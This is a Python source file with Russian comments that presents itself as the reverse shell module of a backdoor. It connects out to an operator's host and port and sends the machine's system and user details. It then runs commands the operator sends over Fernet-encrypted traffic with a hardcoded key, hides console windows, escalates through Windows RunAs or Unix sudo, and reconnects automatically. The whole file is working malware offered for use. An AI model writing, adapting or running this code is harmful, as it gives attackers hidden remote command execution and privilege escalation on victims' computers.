#!/usr/bin/env python3
"""
Reverse Shell модуль для улучшенного бэкдора.
Обеспечивает полноценный доступ к командной строке с шифрованной коммуникацией.
"""

import socket
import threading
import subprocess
import platform
import os
import sys
import time
import json
import base64
import tempfile
import logging
from typing import Optional, Dict, Any
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ReverseShell:
    """Класс для управления reverse shell соединениями."""
    
    def __init__(self, host: str = "127.0.0.1", port: int = 4444, 
                 encryption_key: str = "backdoor_secret_key_2024"):
        """
        Инициализация reverse shell.
        
        Args:
            host: IP адрес сервера
            port: Порт для соединения
            encryption_key: Ключ для шифрования
        """
        self.host = host
        self.port = port
        self.encryption_key = encryption_key
        self.fernet = self._create_fernet()
        self.socket = None
        self.is_connected = False
        self.is_running = False
        self.reconnect_attempts = 0
        self.max_reconnect_attempts = 10
        self.reconnect_delay = 5
        
        # Информация о системе
        self.system_info = self._get_system_info()
        
    def _create_fernet(self) -> Fernet:
        """Создает Fernet объект для шифрования."""
        try:
            # Генерируем ключ из пароля
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=b'backdoor_salt_2024',
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(self.encryption_key.encode()))
            return Fernet(key)
        except Exception as e:
            logger.error(f"Ошибка создания ключа шифрования: {e}")
            # Fallback на простой ключ
            return Fernet(base64.urlsafe_b64encode(self.encryption_key.encode().ljust(32)[:32]))
    
    def _get_system_info(self) -> Dict[str, Any]:
        """Получает информацию о системе."""
        return {
            "platform": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "hostname": platform.node(),
            "username": os.getenv('USERNAME') or os.getenv('USER'),
            "current_dir": os.getcwd(),
            "python_version": sys.version
        }
    
    def _encrypt_data(self, data: str) -> bytes:
        """Шифрует данные."""
        try:
            return self.fernet.encrypt(data.encode('utf-8'))
        except Exception as e:
            logger.error(f"Ошибка шифрования: {e}")
            return data.encode('utf-8')
    
    def _decrypt_data(self, data: bytes) -> str:
        """Расшифровывает данные."""
        try:
            return self.fernet.decrypt(data).decode('utf-8')
        except Exception as e:
            logger.error(f"Ошибка расшифровки: {e}")
            return data.decode('utf-8', errors='ignore')
    
    def _send_data(self, data: str) -> bool:
        """Отправляет зашифрованные данные."""
        try:
            if self.socket and self.is_connected:
                encrypted_data = self._encrypt_data(data)
                # Отправляем длину данных + сами данные
                length = len(encrypted_data)
                self.socket.send(length.to_bytes(4, byteorder='big'))
                self.socket.send(encrypted_data)
                return True
        except Exception as e:
            logger.error(f"Ошибка отправки данных: {e}")
            self.is_connected = False
        return False
    
    def _receive_data(self) -> Optional[str]:
        """Получает и расшифровывает данные."""
        try:
            if self.socket and self.is_connected:
                # Получаем длину данных
                length_data = self.socket.recv(4)
                if not length_data:
                    return None
                
                length = int.from_bytes(length_data, byteorder='big')
                
                # Получаем данные
                data = b''
                while len(data) < length:
                    chunk = self.socket.recv(length - len(data))
                    if not chunk:
                        break
                    data += chunk
                
                if data:
                    return self._decrypt_data(data)
        except Exception as e:
            logger.error(f"Ошибка получения данных: {e}")
            self.is_connected = False
        return None
    
    def _execute_command(self, command: str, admin: bool = False) -> str:
        """Выполняет команду и возвращает результат."""
        try:
            if platform.system() == "Windows":
                return self._execute_command_windows(command, admin)
            else:
                return self._execute_command_unix(command, admin)
        except Exception as e:
            return f"Ошибка выполнения команды: {e}"
    
    def _execute_command_windows(self, command: str, admin: bool = False) -> str:
        """Выполняет команду в Windows."""
        try:
            if admin:
                # Создаем временный bat файл
                with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False, encoding='cp866') as f:
                    f.write(f'@echo off\n{command}\n')
                    bat_file = f.name
                
                # Выполняем с правами администратора
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                
                process = subprocess.run(
                    ['powershell', '-Command', f'Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "{bat_file}" -WindowStyle Hidden -Verb RunAs -Wait'],
                    capture_output=True,
                    text=True,
                    encoding='cp866',
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                # Удаляем временный файл
                try:
                    os.unlink(bat_file)
                except:
                    pass
                
                return process.stdout + process.stderr
            else:
                # Обычное выполнение
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                
                process = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    encoding='cp866',
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                return process.stdout + process.stderr
                
        except Exception as e:
            return f"Ошибка выполнения команды Windows: {e}"
    
    def _execute_command_unix(self, command: str, admin: bool = False) -> str:
        """Выполняет команду в Unix-системах."""
        try:
            if admin:
                # Выполняем с sudo
                process = subprocess.run(
                    ['sudo', 'sh', '-c', command],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            else:
                # Обычное выполнение
                process = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            
            return process.stdout + process.stderr
            
        except subprocess.TimeoutExpired:
            return "Команда превысила лимит времени выполнения (30 сек)"
        except Exception as e:
            return f"Ошибка выполнения команды Unix: {e}"
    
    def _handle_command(self, command_data: str) -> str:
        """Обрабатывает полученную команду."""
        try:
            # Парсим команду
            if command_data.startswith('CMD:'):
                command = command_data[4:]
                admin = False
            elif command_data.startswith('ADMIN_CMD:'):
                command = command_data[10:]
                admin = True
            elif command_data == 'INFO':
                return json.dumps(self.system_info, ensure_ascii=False, indent=2)
            elif command_data == 'PING':
                return 'PONG'
            elif command_data == 'EXIT':
                self.is_running = False
                return 'Disconnecting...'
            else:
                command = command_data
                admin = False
            
            # Выполняем команду
            result = self._execute_command(command, admin)
            return result
            
        except Exception as e:
            return f"Ошибка обработки команды: {e}"
    
    def _connect(self) -> bool:
        """Устанавливает соединение с сервером."""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((self.host, self.port))
            self.is_connected = True
            self.reconnect_attempts = 0
            
            # Отправляем информацию о системе
            system_info = json.dumps(self.system_info, ensure_ascii=False)
            self._send_data(f"CONNECT:{system_info}")
            
            logger.info(f"Reverse shell подключен к {self.host}:{self.port}")
            return True
            
        except Exception as e:
            logger.error(f"Ошибка подключения: {e}")
            self.is_connected = False
            return False
    
    def _reconnect(self) -> bool:
        """Переподключается к серверу."""
        if self.reconnect_attempts >= self.max_reconnect_attempts:
            logger.error("Превышено максимальное количество попыток переподключения")
            return False
        
        self.reconnect_attempts += 1
        logger.info(f"Попытка переподключения {self.reconnect_attempts}/{self.max_reconnect_attempts}")
        
        time.sleep(self.reconnect_delay)
        return self._connect()
    
    def _listen_loop(self):
        """Основной цикл прослушивания команд."""
        while self.is_running:
            try:
                if not self.is_connected:
                    if not self._reconnect():
                        break
                    continue
                
                # Получаем команду
                command = self._receive_data()
                if command is None:
                    logger.warning("Соединение потеряно")
                    self.is_connected = False
                    continue
                
                # Обрабатываем команду
                result = self._handle_command(command)
                
                # Отправляем результат
                if not self._send_data(result):
                    logger.error("Не удалось отправить результат")
                    self.is_connected = False
                
            except Exception as e:
                logger.error(f"Ошибка в цикле прослушивания: {e}")
                self.is_connected = False
    
    def start(self):
        """Запускает reverse shell."""
        if self.is_running:
            logger.warning("Reverse shell уже запущен")
            return
        
        self.is_running = True
        logger.info(f"Запуск reverse shell на {self.host}:{self.port}")
        
        # Запускаем в отдельном потоке
        self.listen_thread = threading.Thread(target=self._listen_loop, daemon=True)
        self.listen_thread.start()
    
    def stop(self):
        """Останавливает reverse shell."""
        self.is_running = False
        self.is_connected = False
        
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        
        logger.info("Reverse shell остановлен")
    
    def get_status(self) -> Dict[str, Any]:
        """Возвращает статус reverse shell."""
        return {
            "is_running": self.is_running,
            "is_connected": self.is_connected,
            "host": self.host,
            "port": self.port,
            "reconnect_attempts": self.reconnect_attempts,
            "system_info": self.system_info
        }


# Функции для интеграции с основным бэкдором

def start_reverse_shell(host: str = "127.0.0.1", port: int = 4444, 
                       encryption_key: str = "backdoor_secret_key_2024") -> ReverseShell:
    """
    Запускает reverse shell.
    
    Args:
        host: IP адрес сервера
        port: Порт для соединения
        encryption_key: Ключ для шифрования
    
    Returns:
        Объект ReverseShell
    """
    shell = ReverseShell(host, port, encryption_key)
    shell.start()
    return shell

def stop_reverse_shell(shell: ReverseShell):
    """Останавливает reverse shell."""
    if shell:
        shell.stop()

def get_reverse_shell_status(shell: ReverseShell) -> Dict[str, Any]:
    """Возвращает статус reverse shell."""
    if shell:
        return shell.get_status()
    return {"error": "Reverse shell не инициализирован"}

def execute_command_via_shell(shell: ReverseShell, command: str, admin: bool = False) -> str:
    """
    Выполняет команду через reverse shell.
    
    Args:
        shell: Объект ReverseShell
        command: Команда для выполнения
        admin: Выполнить с правами администратора
    
    Returns:
        Результат выполнения команды
    """
    if shell and shell.is_connected:
        return shell._execute_command(command, admin)
    return "Reverse shell не подключен"


# Глобальная переменная для хранения экземпляра
_global_shell = None

def init_global_shell(host: str = "127.0.0.1", port: int = 4444, 
                     encryption_key: str = "backdoor_secret_key_2024"):
    """Инициализирует глобальный reverse shell."""
    global _global_shell
    if _global_shell:
        _global_shell.stop()
    _global_shell = ReverseShell(host, port, encryption_key)
    _global_shell.start()
    return _global_shell

def get_global_shell() -> Optional[ReverseShell]:
    """Возвращает глобальный экземпляр reverse shell."""
    return _global_shell

def stop_global_shell():
    """Останавливает глобальный reverse shell."""
    global _global_shell
    if _global_shell:
        _global_shell.stop()
        _global_shell = None


# Тестовые функции

def test_reverse_shell():
    """Тестирует функциональность reverse shell."""
    print("🧪 Тестирование Reverse Shell")
    print("=" * 40)
    
    # Создаем тестовый экземпляр
    shell = ReverseShell("127.0.0.1", 4444)
    
    # Тестируем системную информацию
    print("📊 Системная информация:")
    print(json.dumps(shell.system_info, ensure_ascii=False, indent=2))
    
    # Тестируем выполнение команд
    test_commands = [
        ("echo Hello from Reverse Shell", False),
        ("whoami", False),
        ("dir" if platform.system() == "Windows" else "ls", False),
    ]
    
    print("\n🔧 Тестирование команд:")
    for command, admin in test_commands:
        print(f"\nКоманда: {command} (admin: {admin})")
        result = shell._execute_command(command, admin)
        print(f"Результат: {result[:200]}..." if len(result) > 200 else f"Результат: {result}")
    
    print("\n✅ Тестирование завершено")


if __name__ == "__main__":
    test_reverse_shell()
